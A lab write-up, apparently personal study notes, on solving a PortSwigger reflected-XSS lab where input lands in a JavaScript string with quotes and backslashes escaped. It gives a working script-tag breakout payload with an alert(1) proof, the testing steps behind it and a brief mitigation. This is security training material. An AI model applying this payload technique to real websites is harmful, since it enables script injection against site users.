# Lab18 - Reflected XSS Into A JavaScript String With Single Quote And Backslash Escaped

## Objective

Exploit a reflected XSS vulnerability where user input is reflected inside a JavaScript string.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | JavaScript String |
| Platform | PortSwigger |

---

# Vulnerability Overview

The search term is reflected inside:

```javascript
var searchTerms = 'USER_INPUT';
```

The application escapes:

```javascript
'
\
```

characters.

---

# Analysis

## Step 1

Search:

```text
carry123
```

---

## Step 2

Inspect page source.

Observed:

```javascript
var searchTerms = 'carry123';
```

---

## Step 3

Test Quote

Input:

```javascript
'
```

Response:

```javascript
\'
```

---

## Step 4

Test Backslash

Input:

```javascript
\
```

Response:

```javascript
\\
```

---

## Key Observation

Both:

```javascript
'
\
```

are escaped.

---

## Exploitation Strategy

Terminate:

```html
<script>
```

block instead.

---

# Full Payload(s) Used

```html
</script><script>alert(1)</script>
```

---

# Why The Payload Works

Original:

```html
<script>

var searchTerms='USER_INPUT';

</script>
```

---

Injected:

```html
</script>
<script>
alert(1)
</script>
```

---

Execution Flow

```text
Close Script
        ↓
Create New Script
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Break JavaScript string.

---

## Problem

Application escapes:

```javascript
'
\
```

---

## Key Realization

Instead of escaping string:

```text
Terminate Script Tag
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

HTML encode:

```html
<
>
```

inside script blocks.

Avoid reflecting user input directly.

---

# Related Theory

- 26-terminating-the-existing-script.md

---

# Key Learnings

- Script termination bypasses quote escaping.
- HTML parser executes before JavaScript parser.